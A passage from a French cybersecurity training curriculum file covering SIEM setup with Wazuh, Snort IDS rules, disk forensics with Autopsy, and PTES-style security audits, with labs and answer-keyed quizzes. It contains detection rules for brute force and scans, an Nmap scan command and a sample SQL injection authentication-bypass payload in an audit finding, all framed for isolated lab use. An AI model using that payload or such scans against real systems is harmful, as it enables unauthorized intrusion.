    { heading: "Configuration des collecteurs de logs (agents)", html: "<p>Chaque machine à surveiller reçoit un agent Wazuh qui remonte ses journaux vers le manager. Extrait de fichier d'agent <code>ossec.conf</code> ciblant les logs d'authentification et un dossier applicatif :</p><pre><code>&lt;ossec_config&gt;\n  &lt;client&gt;\n    &lt;server&gt;\n      &lt;address&gt;10.0.0.5&lt;/address&gt;\n    &lt;/server&gt;\n  &lt;/client&gt;\n  &lt;localfile&gt;\n    &lt;log_format&gt;syslog&lt;/log_format&gt;\n    &lt;location&gt;/var/log/auth.log&lt;/location&gt;\n  &lt;/localfile&gt;\n&lt;/ossec_config&gt;</code></pre><p>Sous une stack ELK classique, cette collecte est assurée par <strong>Filebeat</strong>, qui expédie les logs vers Logstash ou directement vers Elasticsearch.</p>" },
    { heading: "Construction de tableaux de bord et règles d'alerte", html: "<p>Une fois les données indexées, on construit des visualisations Kibana (échecs de connexion par heure, top des IP sources, alertes par criticité) puis on définit des règles de corrélation. Exemple simplifié de règle Wazuh détectant des tentatives de connexion SSH répétées :</p><pre><code>&lt;rule id=\"100010\" level=\"10\"&gt;\n  &lt;if_matched_sid&gt;5716&lt;/if_matched_sid&gt;\n  &lt;same_source_ip/&gt;\n  &lt;frequency&gt;6&lt;/frequency&gt;\n  &lt;timeframe&gt;120&lt;/timeframe&gt;\n  &lt;description&gt;Tentative de brute force SSH détectée&lt;/description&gt;\n  &lt;group&gt;authentication_failures,&lt;/group&gt;\n&lt;/rule&gt;</code></pre><p>Cette approche illustre directement les techniques de détection cataloguées dans <strong>MITRE ATT&amp;CK</strong> (technique T1110 — Brute Force).</p>" }
  ],
  standards: ["NIST Cybersecurity Framework — fonction Detect (DE)", "NIST SP 800-61 — Computer Security Incident Handling Guide", "CompTIA CySA+ — Domaine 2 : Adversary Tactics, Techniques and Procedures"],
  steps: [
    { text: "Découvrir le rôle et l'organisation d'un SOC (analystes N1/N2/N3).", color: "green" },
    { text: "Installer une stack SIEM (Wazuh ou ELK) sur une VM dédiée.", color: "green" },
    { text: "Configurer les collecteurs (agents Wazuh, Filebeat) sur les sources de logs.", color: "green" },
    { text: "Créer des tableaux de bord de supervision (Kibana / Wazuh dashboards).", color: "green" },
    { text: "Mettre en place des règles d'alerte et de corrélation.", color: "green" },
    { text: "Livrable : Tableau de bord SIEM opérationnel avec alertes configurées.", color: "red" }
  ],
  deliverable: "Un manager Wazuh (ou stack ELK) fonctionnel, au moins deux agents remontant leurs logs, un tableau de bord Kibana/Wazuh avec au moins trois visualisations, et une règle d'alerte personnalisée déclenchée avec succès.",
  tp: {
    title: "TP S19 — Déployer un mini-SOC avec Wazuh",
    objectif: "Installer une stack SIEM complète, collecter des logs réels et construire un tableau de bord de supervision avec alertes.",
    duree: "3 à 4 heures",
    materiel: ["VM Ubuntu Server 22.04 (manager Wazuh, 4 Go RAM min)", "Une ou deux VM agents (Linux et/ou Windows)", "Accès internet pour les paquets d'installation", "Navigateur pour accéder au dashboard"],
    consignes: [
      "Installer le manager Wazuh sur la VM dédiée via le script officiel et récupérer les identifiants du dashboard.",
      "Se connecter à Wazuh Dashboard et vérifier l'état du cluster (Elasticsearch/OpenSearch, indexeur, manager).",
      "Installer un agent Wazuh sur une seconde VM et l'enregistrer auprès du manager.",
      "Vérifier dans le dashboard que les événements de l'agent (connexions, processus, intégrité de fichiers) remontent correctement.",
      "Créer un tableau de bord personnalisé avec au moins trois visualisations (alertes par sévérité, top IP sources, événements par agent).",
      "Générer volontairement plusieurs échecs d'authentification SSH sur l'agent pour déclencher une règle de détection de brute force.",
      "Documenter, captures d'écran à l'appui, le trajet complet d'un événement : de la génération du log jusqu'à l'alerte affichée dans le dashboard."
    ],
    livrable: "Rapport avec captures d'écran du dashboard, des visualisations créées et de l'alerte de brute force déclenchée.",
    criteres: ["Manager Wazuh installé et accessible", "Au moins un agent enregistré et remontant des logs en continu", "Tableau de bord avec au moins trois visualisations pertinentes", "Alerte de sécurité déclenchée et documentée"]
  },
  quiz: [
    { q: "Quel est le rôle principal d'un analyste SOC de niveau N1 ?", options: ["Rédiger la politique de sécurité de l'entreprise", "Trier les alertes et effectuer un premier diagnostic avant escalade", "Développer les applications métier", "Négocier les contrats fournisseurs"], correct: 1, explanation: "L'analyste N1 est en première ligne : il trie le flux d'alertes, effectue un premier diagnostic et escalade les cas complexes vers le N2." },
    { q: "Que signifie l'acronyme SIEM ?", options: ["Security Incident and Event Monitoring", "Security Information and Event Management", "System Information and Encryption Module", "Secure Internet Exchange Manager"], correct: 1, explanation: "SIEM signifie Security Information and Event Management : une plateforme qui collecte, corrèle et met en alerte à partir des journaux système." },
    { q: "Quel composant de la stack ELK est responsable de la visualisation des données ?", options: ["Elasticsearch", "Logstash", "Kibana", "Filebeat"], correct: 2, explanation: "Kibana est l'interface de visualisation et de création de tableaux de bord de la stack ELK ; Elasticsearch indexe, Logstash transforme, Filebeat collecte." },
    { q: "À quelle fonction du NIST Cybersecurity Framework les activités d'un SOC sont-elles principalement rattachées ?", options: ["Identify et Protect uniquement", "Detect et Respond", "Recover uniquement", "Aucune, le SOC est hors périmètre du NIST CSF"], correct: 1, explanation: "La surveillance continue et la réaction aux incidents relèvent directement des fonctions Detect (DE) et Respond (RS) du NIST CSF." },
    { q: "Dans une règle Wazuh de détection de brute force SSH, à quoi sert la balise <frequency> ?", options: ["À définir la version du protocole SSH", "À indiquer le nombre d'occurrences de l'événement nécessaires pour déclencher l'alerte", "À chiffrer le mot de passe de l'agent", "À planifier la sauvegarde des logs"], correct: 1, explanation: "La balise <frequency> combinée à <timeframe> définit le seuil de répétition d'un événement (ex. 6 échecs en 120 secondes) qui déclenche la corrélation et l'alerte." }
  ]
},
{
  id: "S20", week: 20, phase: 4,
  title: "Détection d'intrusion avec Snort",
  level: "expert",
  duration: "Semaine 20 · ~10h",
  intro: "Un SIEM centralise les logs, mais encore faut-il générer des événements de sécurité pertinents au niveau réseau. Cette semaine met les mains dans Snort, l'un des IDS/IPS open source les plus utilisés au monde, pour écrire vos propres règles de détection et analyser des alertes réelles.",
  objectives: [
    "Différencier un IDS d'un IPS et comprendre leur positionnement dans une architecture réseau.",
    "Installer et configurer Snort en mode détection (IDS).",
    "Écrire des règles Snort personnalisées ciblant des comportements suspects.",
    "Générer du trafic malveillant contrôlé (scan Nmap) et valider la détection.",
    "Analyser et documenter des alertes issues d'un journal Snort."
  ],
  definition: "Un IDS (Intrusion Detection System) analyse le trafic réseau ou l'activité d'un hôte pour repérer des signatures ou comportements suspects, et déclenche une alerte sans bloquer le trafic ; un IPS (Intrusion Prevention System) va plus loin en bloquant activement la menace détectée. Cette semaine couvre l'installation de Snort en mode IDS, l'écriture de règles de détection et l'analyse des alertes générées.",
  analogy: { title: "🐕 Snort comme chien de garde", text: "Un IDS agit comme un chien de garde bien dressé : il ne mord pas l'intrus (contrairement à un IPS), mais il aboie systématiquement dès qu'il reconnaît une odeur suspecte, laissant à l'humain le soin de décider de la suite." },
  keyTerms: [
    { term: "IDS", def: "Intrusion Detection System : système de détection qui analyse le trafic et alerte sans bloquer." },
    { term: "IPS", def: "Intrusion Prevention System : système de prévention qui détecte ET bloque activement le trafic malveillant." },
    { term: "Règle Snort", def: "Instruction structurée (action, protocole, adresses, port, contenu) qui définit un motif de détection." },
    { term: "Signature", def: "Motif caractéristique (chaîne, séquence d'octets, comportement) permettant d'identifier une attaque connue." },
    { term: "Faux positif", def: "Alerte déclenchée à tort sur un trafic légitime, à distinguer d'un faux négatif (attaque non détectée)." }
  ],
  lesson: [
    { heading: "IDS vs IPS : positionnement et modes", html: "<p>Un <strong>IDS</strong> est généralement placé en écoute passive (mode SPAN/mirroring) et se contente d'alerter. Un <strong>IPS</strong> est placé en coupure (inline) sur le flux réseau et peut bloquer un paquet en temps réel. Snort peut fonctionner dans les deux modes ; cette semaine se concentre volontairement sur le mode IDS, plus adapté à l'apprentissage de la détection sans risque de coupure de service.</p>" },
    { heading: "Installation et configuration de Snort", html: "<p>Sur une distribution Debian/Ubuntu :</p><pre><code>sudo apt update &amp;&amp; sudo apt install snort -y\n# Identifier l'interface réseau à surveiller\nip a\n# Lancer Snort en mode sniffer/IDS avec le fichier de règles local\nsudo snort -A console -q -c /etc/snort/snort.conf -i eth0</code></pre><p>Le fichier <code>snort.conf</code> centralise les variables réseau (HOME_NET, EXTERNAL_NET) et les chemins vers les fichiers de règles à charger.</p>" },
    { heading: "Anatomie d'une règle Snort", html: "<p>Une règle Snort se compose d'un en-tête (action, protocole, IP/port source et destination) et d'options entre parenthèses (contenu recherché, message, identifiant unique). Exemple de règle détectant un scan Nmap de type SYN :</p><pre><code>alert tcp any any -&gt; $HOME_NET any (msg:\"POSSIBLE NMAP SYN SCAN\"; flags:S; \\\nthreshold: type threshold, track by_src, count 20, seconds 3; \\\nsid:1000001; rev:1;)</code></pre><p>Cette règle déclenche une alerte si plus de 20 paquets SYN proviennent de la même source en 3 secondes — signature typique d'un scan de ports.</p>" },
    { heading: "Écrire une règle ciblant une signature applicative", html: "<p>Snort peut aussi inspecter le contenu des paquets. Exemple de règle détectant une tentative d'accès à une page d'administration sensible en clair sur HTTP :</p><pre><code>alert tcp any any -&gt; $HOME_NET 80 (msg:\"ACCES SUSPECT /admin\"; \\\ncontent:\"GET /admin\"; nocase; sid:1000002; rev:1;)</code></pre><p>Ce type de règle illustre la détection par signature, complémentaire de la détection par seuil (threshold) vue précédemment.</p>" },
    { heading: "Tester et analyser les alertes", html: "<p>Depuis une machine attaquante, un scan Nmap classique permet de valider les règles :</p><pre><code>nmap -sS -T4 192.168.1.10</code></pre><p>Les alertes générées sont journalisées dans <code>/var/log/snort/alert</code>. Chaque ligne doit être analysée avec méthode : horodatage, IP source/destination, règle déclenchée (SID), et niveau de criticité — la base de tout journal d'alertes commenté transmis à un analyste SOC de niveau supérieur.</p>" }
  ],
  standards: ["MITRE ATT&CK — technique T1046 (Network Service Discovery) et T1595 (Active Scanning)", "NIST Cybersecurity Framework — fonction Detect (DE.CM : Security Continuous Monitoring)", "CompTIA CySA+ — Domaine 1 : Security Operations"],
  steps: [
    { text: "Installer Snort sur une VM Ubuntu Server.", color: "green" },
    { text: "Configurer Snort en mode IDS (snort.conf, interface d'écoute).", color: "green" },
    { text: "Écrire des règles Snort personnalisées.", color: "green" },
    { text: "Tester la détection avec des scans Nmap contrôlés.", color: "green" },
    { text: "Analyser les alertes générées dans le journal Snort.", color: "green" },
    { text: "Livrable : Journal d'alertes commenté.", color: "red" }
  ],
  deliverable: "Une instance Snort fonctionnelle en mode IDS, au moins trois règles personnalisées validées, et un journal d'alertes commenté expliquant chaque détection (source, règle déclenchée, interprétation).",
  tp: {
    title: "TP S20 — Détecter un scan réseau avec Snort",
    objectif: "Configurer Snort en mode IDS, écrire des règles de détection personnalisées et produire un journal d'alertes analysé.",
    duree: "2 à 3 heures",
    materiel: ["VM Ubuntu Server avec Snort installé", "VM attaquante avec Nmap installé", "Accès réseau entre les deux VM (réseau interne isolé)"],
    consignes: [
      "Installer Snort et identifier l'interface réseau à surveiller avec `ip a`.",
      "Configurer le fichier snort.conf avec les variables HOME_NET correspondant au réseau de la VM cible.",
      "Écrire une règle personnalisée détectant un scan SYN basé sur un seuil de fréquence.",
      "Écrire une deuxième règle personnalisée détectant une signature applicative (ex. tentative d'accès à /admin en HTTP).",
      "Lancer Snort en mode console sur l'interface surveillée.",
      "Depuis la VM attaquante, exécuter un scan Nmap SYN puis une requête HTTP ciblant /admin.",
      "Extraire et commenter chaque alerte du journal /var/log/snort/alert : horodatage, IP source, règle déclenchée, interprétation."
    ],
    livrable: "Journal d'alertes Snort exporté et commenté (fichier texte ou capture), accompagné des deux règles personnalisées écrites.",
    criteres: ["Snort fonctionnel en mode IDS sur l'interface correcte", "Au moins deux règles personnalisées écrites et validées", "Alertes générées avec succès lors des tests", "Journal d'alertes clairement commenté et interprété"]
  },
  quiz: [
    { q: "Quelle est la différence fondamentale entre un IDS et un IPS ?", options: ["L'IDS chiffre le trafic, l'IPS ne le fait pas", "L'IDS détecte et alerte, l'IPS détecte et bloque activement", "L'IDS fonctionne uniquement sur Windows", "Il n'y a aucune différence"], correct: 1, explanation: "L'IDS est passif : il alerte sans intervenir sur le trafic. L'IPS est actif (inline) et peut bloquer un paquet identifié comme malveillant." },
    { q: "Dans une règle Snort, à quoi correspond le champ `sid` ?", options: ["Le sous-réseau surveillé", "Un identifiant unique de la règle", "La sévérité de l'alerte", "Le port source"], correct: 1, explanation: "Le SID (Snort ID) est un identifiant unique qui permet de référencer et de suivre chaque règle individuellement." },
    { q: "Quelle option Snort permet de détecter un grand nombre de paquets SYN en peu de temps (scan de ports) ?", options: ["content", "nocase", "threshold", "msg"], correct: 2, explanation: "L'option `threshold` (avec track, count et seconds) définit un seuil de répétition d'événement, typique de la détection de scans." },
    { q: "Selon MITRE ATT&CK, un scan de ports réalisé avec Nmap correspond principalement à quelle technique ?", options: ["T1059 — Command and Scripting Interpreter", "T1046 — Network Service Discovery", "T1486 — Data Encrypted for Impact", "T1078 — Valid Accounts"], correct: 1, explanation: "T1046 (Network Service Discovery) couvre la découverte de services réseau, dont les scans de ports réalisés via des outils comme Nmap." },
    { q: "Où sont journalisées par défaut les alertes générées par Snort sur une installation Linux classique ?", options: ["/etc/snort/rules", "/var/log/snort/alert", "/home/snort/log", "/tmp/snort.conf"], correct: 1, explanation: "Le fichier /var/log/snort/alert (ou le répertoire /var/log/snort/) contient par défaut le journal des alertes générées par Snort." }
  ]
},
{
  id: "S21", week: 21, phase: 4,
  title: "Introduction au forensics numérique",
  level: "expert",
  duration: "Semaine 21 · ~10h",
  intro: "Quand une intrusion a eu lieu, il faut reconstituer les faits avec la rigueur d'un enquêteur : sans altérer la preuve, sans supposition, sans raccourci. Cette semaine initie à l'investigation numérique (forensics), depuis la chaîne de custody jusqu'à l'analyse d'une image disque avec Autopsy.",
  objectives: [
    "Expliquer le principe et l'importance de la chaîne de custody (chain of custody) en investigation numérique.",
    "Acquérir une image disque de manière forensiquement saine (bit-à-bit, avec hachage).",
    "Analyser une image disque avec Autopsy / The Sleuth Kit.",
    "Récupérer des fichiers supprimés et identifier des artefacts numériques.",
    "Reconstituer une chronologie d'incident et rédiger un rapport d'investigation."
  ],
  definition: "Le forensics numérique (investigation numérique légale) consiste à identifier, préserver, analyser et documenter des preuves numériques dans le respect d'une chaîne de custody rigoureuse, afin qu'elles restent exploitables et opposables. Cette semaine couvre l'acquisition d'une image disque, son analyse avec Autopsy, la récupération de fichiers et la reconstitution d'une chronologie d'incident.",
  analogy: { title: "🔎 Le forensics comme scène de crime", text: "Un enquêteur ne touche jamais une scène de crime à mains nues et note chaque geste sur un procès-verbal : c'est exactement le principe de la chaîne de custody appliquée à un disque dur. Une preuve numérique manipulée sans traçabilité perd toute valeur devant un tribunal ou un comité de direction." },
  keyTerms: [
    { term: "Chaîne de custody", def: "Traçabilité complète et documentée de toutes les manipulations d'une preuve, de sa collecte à sa présentation finale." },
    { term: "Image disque bit-à-bit", def: "Copie exacte, secteur par secteur, d'un support de stockage, incluant l'espace non alloué et les fichiers supprimés." },
    { term: "Hachage (empreinte)", def: "Valeur cryptographique (MD5, SHA-256) calculée sur une preuve pour prouver son intégrité et sa non-altération." },
    { term: "Artefact numérique", def: "Trace laissée par une activité (fichier, entrée de registre, log) exploitable comme élément de preuve." },
    { term: "Timeline forensique", def: "Reconstitution chronologique des événements d'un système à partir des métadonnées et journaux collectés." }
  ],
  lesson: [
    { heading: "La chaîne de custody : le socle de toute investigation recevable", html: "<p>Sans chaîne de custody documentée (qui a touché la preuve, quand, comment), une preuve numérique perd sa valeur juridique et probante. Chaque étape — acquisition, transport, stockage, analyse — doit être tracée avec horodatage, identité de l'opérateur et empreinte cryptographique de la preuve. C'est le principe fondamental défendu par la norme <strong>ISO/IEC 27037</strong> sur l'identification, la collecte et la préservation des preuves numériques.</p>" },
    { heading: "Acquisition d'une image disque", html: "<p>L'acquisition doit être bit-à-bit, sans jamais écrire sur le support original (idéalement via un bloqueur en écriture). Sous Linux, la commande <code>dd</code> (ou son équivalent forensique <code>dc3dd</code>) permet une copie brute, suivie du calcul systématique d'une empreinte :</p><pre><code>sudo dd if=/dev/sdb of=/mnt/preuves/disque_suspect.img bs=4M status=progress\nsha256sum /dev/sdb &gt; hash_original.txt\nsha256sum /mnt/preuves/disque_suspect.img &gt; hash_copie.txt\ndiff hash_original.txt hash_copie.txt</code></pre><p>Si les deux empreintes sont identiques, l'intégrité de la copie est prouvée : c'est cette empreinte qui accompagnera la preuve tout au long de la chaîne de custody.</p>" },
    { heading: "Analyse avec Autopsy / The Sleuth Kit", html: "<p>Autopsy fournit une interface graphique au-dessus de The Sleuth Kit pour explorer une image disque sans jamais la modifier. Après création d'un nouveau cas et import de l'image :</p><pre><code># En ligne de commande via The Sleuth Kit\nmmls disque_suspect.img          # Lister les partitions\nfls -r -o 2048 disque_suspect.img   # Lister les fichiers, y compris supprimés\nicat -o 2048 disque_suspect.img 1542 &gt; fichier_recupere.docx</code></pre><p>Dans Autopsy, les modules d'extraction automatique (fichiers récents, historique de navigation, artefacts de registre) accélèrent considérablement le tri initial.</p>" },
    { heading: "Récupération de fichiers supprimés", html: "<p>La suppression d'un fichier ne supprime généralement que son entrée dans la table d'allocation, pas son contenu tant que l'espace n'a pas été réécrit. Autopsy identifie ces fichiers « orphelins » dans le module <em>Deleted Files</em>, permettant leur récupération (carving) tant que les blocs de données originaux n'ont pas été écrasés.</p>" },
    { heading: "Reconstitution d'une chronologie et rapport d'investigation", html: "<p>La fonctionnalité <em>Timeline</em> d'Autopsy croise les métadonnées MAC (Modified, Accessed, Created) de tous les fichiers pour reconstituer, minute par minute, la séquence des événements sur le système compromis. Cette chronologie devient l'ossature du rapport d'investigation final, structuré selon les recommandations <strong>ISO/IEC 27035</strong> pour la gestion des incidents : résumé exécutif, méthodologie, constats, chronologie, conclusions et recommandations.</p>" }
  ],
  standards: ["ISO/IEC 27037 — Identification, collecte, acquisition et préservation des preuves numériques", "ISO/IEC 27035 — Gestion des incidents de sécurité de l'information", "NIST SP 800-61 — Computer Security Incident Handling Guide"],
  steps: [
    { text: "Comprendre le principe et les exigences de la chaîne de custody.", color: "green" },
    { text: "Acquérir une image disque bit-à-bit avec calcul d'empreinte.", color: "green" },
    { text: "Analyser l'image avec Autopsy / The Sleuth Kit.", color: "green" },
    { text: "Récupérer des fichiers supprimés (carving).", color: "green" },
    { text: "Établir une chronologie précise de l'incident.", color: "green" },
    { text: "Livrable : Rapport d'investigation.", color: "red" }
  ],
  deliverable: "Une image disque acquise avec preuve d'intégrité (empreintes concordantes), un cas Autopsy analysé avec au moins deux fichiers supprimés récupérés, et un rapport d'investigation complet incluant chronologie et conclusions.",
  tp: {
    title: "TP S21 — Investigation numérique d'un poste compromis",
    objectif: "Acquérir, analyser et documenter une image disque suspecte dans le respect de la chaîne de custody, puis produire un rapport d'investigation.",
    duree: "3 à 4 heures",
    materiel: ["VM Ubuntu (poste d'analyse) avec Autopsy et The Sleuth Kit installés", "Image disque d'entraînement (ex. image .img fournie avec fichiers supprimés/artefacts simulés)", "Feuille de chaîne de custody (modèle fourni)"],
    consignes: [
      "Documenter l'acquisition de l'image dans une fiche de chaîne de custody : date, opérateur, méthode, empreinte SHA-256.",
      "Calculer et vérifier l'empreinte de l'image fournie avant toute analyse.",
      "Créer un nouveau cas Autopsy et importer l'image disque.",
      "Explorer l'arborescence de fichiers et identifier au moins deux fichiers supprimés récupérables.",
      "Récupérer ces fichiers et examiner leur contenu et leurs métadonnées.",
      "Utiliser le module Timeline pour reconstituer la séquence chronologique des événements suspects.",
      "Rédiger un rapport d'investigation structuré : résumé, méthodologie, constats, chronologie, conclusion."
    ],
    livrable: "Fiche de chaîne de custody remplie + rapport d'investigation (PDF ou Markdown) incluant chronologie et fichiers récupérés.",
    criteres: ["Chaîne de custody correctement documentée avec empreinte vérifiée", "Au moins deux fichiers supprimés récupérés avec succès", "Chronologie cohérente et justifiée par les artefacts", "Rapport structuré, clair et professionnel"]
  },
  quiz: [
    { q: "Pourquoi la chaîne de custody est-elle essentielle en investigation numérique ?", options: ["Elle accélère l'analyse", "Elle garantit la traçabilité et l'intégrité de la preuve pour qu'elle reste opposable", "Elle est facultative si l'enquêteur est expérimenté", "Elle sert uniquement à archiver les fichiers"], correct: 1, explanation: "Sans documentation rigoureuse de chaque manipulation, une preuve numérique perd sa valeur probante, principe central de la norme ISO/IEC 27037." },
    { q: "Quel est l'objectif du calcul d'une empreinte SHA-256 lors de l'acquisition d'une image disque ?", options: ["Compresser l'image", "Prouver que la copie est identique à l'original et n'a pas été altérée", "Chiffrer le contenu du disque", "Accélérer le transfert réseau"], correct: 1, explanation: "Comparer l'empreinte de l'original et de la copie prouve mathématiquement l'intégrité de l'acquisition, condition indispensable à la recevabilité de la preuve." },
    { q: "Que permet la commande `icat` de The Sleuth Kit ?", options: ["Lister les partitions d'une image disque", "Extraire le contenu d'un fichier à partir de son numéro d'inode/adresse", "Calculer une empreinte cryptographique", "Chiffrer un fichier"], correct: 1, explanation: "`icat` extrait le contenu brut d'un fichier identifié par son adresse (inode), y compris pour des fichiers supprimés dont les blocs n'ont pas été réécrits." },
    { q: "Que représentent les métadonnées MAC utilisées dans une timeline forensique ?", options: ["Modified, Accessed, Created", "Malware, Analysis, Case", "Media, Address, Control", "Manual, Automatic, Combined"], correct: 0, explanation: "MAC désigne les horodatages Modified (modification), Accessed (accès) et Created (création) d'un fichier, base de la reconstitution chronologique." },
    { q: "Quelle norme ISO/IEC porte spécifiquement sur l'identification, la collecte et la préservation des preuves numériques ?", options: ["ISO/IEC 27001", "ISO/IEC 27037", "ISO/IEC 9001", "ISO/IEC 20000"], correct: 1, explanation: "ISO/IEC 27037 encadre spécifiquement les lignes directrices d'identification, de collecte, d'acquisition et de préservation des preuves numériques." }
  ]
},
{
  id: "S22", week: 22, phase: 4,
  title: "Audit de sécurité",
  level: "expert",
  duration: "Semaine 22 · ~10h",
  intro: "Savoir trouver une vulnérabilité ne suffit pas : un professionnel doit savoir la documenter, la prioriser et la communiquer à un décideur non technique. Cette semaine structure une démarche d'audit de sécurité complète, du cadrage à la rédaction d'un rapport professionnel exploitable par un client.",
  objectives: [
    "Appliquer une méthodologie d'audit de sécurité structurée et reproductible.",
    "Définir un périmètre d'audit précis (scope) et des règles d'engagement.",
    "Réaliser des tests techniques et analyser les vulnérabilités identifiées selon leur criticité.",
    "Rédiger un rapport d'audit professionnel conforme aux standards du secteur.",
    "Formuler des recommandations de remédiation priorisées et actionnables."
  ],
  definition: "L'audit de sécurité est une évaluation méthodique et documentée du niveau de sécurité d'un système d'information, structurée en phases (cadrage, reconnaissance, tests, analyse, restitution) et aboutissant à un rapport professionnel. Cette semaine couvre la méthodologie d'audit, la définition du périmètre, la réalisation des tests, l'analyse des vulnérabilités et la rédaction du rapport final selon les standards reconnus (PTES).",
  analogy: { title: "🏥 L'audit comme bilan de santé complet", text: "Un audit de sécurité ressemble à un bilan de santé médical : on ne se contente pas de dire « vous êtes malade », on documente chaque symptôme, on hiérarchise les risques (bénin, préoccupant, urgent) et on prescrit un traitement précis et suivi dans le temps." },
  keyTerms: [
    { term: "Scope (périmètre)", def: "Ensemble précis des systèmes, applications ou adresses IP autorisés à être testés lors d'un audit." },
    { term: "Rules of Engagement", def: "Document formalisant les règles, horaires, contacts d'urgence et limites techniques d'un audit." },
    { term: "PTES", def: "Penetration Testing Execution Standard : référentiel définissant les sept phases d'un test d'intrusion professionnel." },
    { term: "CVSS", def: "Common Vulnerability Scoring System : système de notation standardisé de la criticité d'une vulnérabilité." },
    { term: "Remédiation", def: "Action corrective recommandée pour éliminer ou réduire une vulnérabilité identifiée." }
  ],
  lesson: [
    { heading: "Méthodologie d'audit : le standard PTES", html: "<p>Le <strong>PTES</strong> (Penetration Testing Execution Standard) structure un audit en sept phases : interactions pré-engagement, collecte de renseignements, modélisation des menaces, analyse de vulnérabilités, exploitation, post-exploitation et <strong>rapport</strong>. Cette structure garantit la reproductibilité et la comparabilité des audits d'une mission à l'autre, un principe attendu par tout client professionnel ou certification CompTIA CySA+/PenTest+.</p>" },
    { heading: "Définir le périmètre et les règles d'engagement", html: "<p>Avant tout test technique, un document de cadrage formalise :</p><ul><li>Le <strong>périmètre exact</strong> : IP, domaines, applications, exclusions explicites.</li><li>La <strong>fenêtre temporelle</strong> autorisée (horaires, dates).</li><li>Les <strong>contacts d'urgence</strong> en cas d'incident pendant les tests.</li><li>L'<strong>autorisation écrite</strong> signée, condition légale indispensable avant toute action.</li></ul><p>Sans ce cadrage, un audit techniquement identique devient juridiquement un accès frauduleux à un système.</p>" },
    { heading: "Réaliser les tests et analyser les vulnérabilités", html: "<p>Les tests combinent scans automatisés (Nmap, Nessus/OpenVAS) et vérifications manuelles pour éliminer les faux positifs. Chaque vulnérabilité confirmée est notée selon le <strong>CVSS</strong> pour objectiver sa criticité :</p><pre><code>Vulnérabilité : Injection SQL sur le formulaire de connexion (/login)\nCVSS v3.1 : 9.8 (Critique)\nVecteur : AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H\nPreuve de concept : ' OR '1'='1' -- \nImpact : Contournement d'authentification, extraction de la base utilisateurs</code></pre><p>Cette fiche structurée (vulnérabilité, score, preuve, impact) constitue le bloc de base de tout rapport d'audit.</p>" },
    { heading: "Rédiger le rapport d'audit professionnel", html: "<p>Un rapport d'audit conforme au standard PTES comprend généralement : un <strong>résumé exécutif</strong> non technique destiné à la direction, une <strong>synthèse des risques</strong> par criticité, le <strong>détail technique</strong> de chaque vulnérabilité (description, preuve, impact, remédiation), et une <strong>annexe méthodologique</strong>. Le résumé exécutif est souvent la seule partie lue par un décideur : il doit être clair, chiffré et orienté décision.</p>" },
    { heading: "Prioriser les recommandations de remédiation", html: "<p>Chaque vulnérabilité doit être accompagnée d'une recommandation concrète et priorisée (immédiate, court terme, moyen terme), en cohérence avec les fonctions <strong>Identify</strong> et <strong>Protect</strong> du NIST CSF. Un tableau de synthèse final permet au client de suivre l'avancement de la remédiation dans le temps, souvent lors d'un audit de contrôle (retest).</p>" }
  ],
  standards: ["PTES — Penetration Testing Execution Standard (structure du rapport)", "NIST Cybersecurity Framework — fonctions Identify (ID) et Protect (PR)", "ISO/IEC 27001 — Annexe A, gestion des risques et amélioration continue"],
  steps: [
    { text: "Étudier la méthodologie d'audit PTES.", color: "green" },
    { text: "Définir le périmètre et les règles d'engagement.", color: "green" },
    { text: "Réaliser les tests techniques (scans, vérifications manuelles).", color: "green" },
    { text: "Analyser et noter les vulnérabilités (CVSS).", color: "green" },
    { text: "Rédiger le rapport d'audit professionnel.", color: "green" },
    { text: "Livrable : Rapport d'audit.", color: "red" }
  ],
  deliverable: "Un rapport d'audit complet conforme au standard PTES : résumé exécutif, périmètre documenté, au moins trois vulnérabilités notées CVSS avec preuve et impact, et recommandations de remédiation priorisées.",
  tp: {
    title: "TP S22 — Auditer une application web vulnérable et rédiger le rapport",
    objectif: "Réaliser un audit de sécurité complet sur une cible d'entraînement et produire un rapport professionnel conforme au standard PTES.",
    duree: "4 à 5 heures",
    materiel: ["VM cible (ex. DVWA ou OWASP Juice Shop) sur réseau isolé", "VM attaquante avec Nmap, Burp Suite (ou ZAP), navigateur", "Modèle de rapport d'audit (structure PTES)"],
    consignes: [
      "Rédiger un document de cadrage précisant le périmètre exact (IP/URL) et les règles d'engagement de l'audit.",
      "Réaliser une phase de reconnaissance (Nmap, énumération des technologies) sur la cible.",
      "Identifier au minimum trois vulnérabilités distinctes en combinant scan automatisé et vérification manuelle.",
      "Noter chaque vulnérabilité avec un score CVSS v3.1 et documenter une preuve de concept reproductible.",
      "Analyser l'impact métier de chaque vulnérabilité (confidentialité, intégrité, disponibilité).",
      "Rédiger le rapport complet : résumé exécutif, synthèse des risques, détail technique, recommandations priorisées.",
      "Relire le rapport en se mettant à la place d'un dirigeant non technique lisant uniquement le résumé exécutif."
    ],
    livrable: "Rapport d'audit complet au format PDF ou Markdown, structuré selon le standard PTES.",
    criteres: ["Périmètre et règles d'engagement clairement documentés", "Au moins trois vulnérabilités identifiées, notées CVSS et prouvées", "Résumé exécutif clair et compréhensible par un non-technicien", "Recommandations de remédiation concrètes et priorisées"]
  },
  quiz: [
    { q: "Combien de phases comporte la méthodologie PTES ?", options: ["Trois", "Cinq", "Sept", "Dix"], correct: 2, explanation: "Le PTES définit sept phases : pré-engagement, collecte de renseignements, modélisation des menaces, analyse de vulnérabilités, exploitation, post-exploitation et rapport." },
    { q: "Que doit impérativement contenir le document de cadrage avant un audit ?", options: ["Uniquement la liste des outils utilisés", "Le périmètre exact, la fenêtre temporelle et l'autorisation écrite signée", "Le CV de l'auditeur", "La liste des employés de l'entreprise cliente"], correct: 1, explanation: "Sans périmètre défini et autorisation écrite, un test technique identique devient un accès non autorisé au regard de la loi." },
    { q: "À quoi sert le score CVSS dans un rapport d'audit ?", options: ["À chiffrer le rapport", "À objectiver et standardiser la criticité d'une vulnérabilité", "À identifier l'auditeur", "À calculer la durée de la mission"], correct: 1, explanation: "Le CVSS (Common Vulnerability Scoring System) fournit une note standardisée (0 à 10) permettant de comparer et prioriser objectivement les vulnérabilités." },
    { q: "À qui s'adresse en priorité le résumé exécutif d'un rapport d'audit ?", options: ["Aux autres auditeurs de l'équipe", "Aux décideurs non techniques (direction)", "Aux moteurs de recherche", "Uniquement à l'équipe de développement"], correct: 1, explanation: "Le résumé exécutif doit être compréhensible par un dirigeant non technique, souvent la seule partie du rapport qu'il lira en détail." },
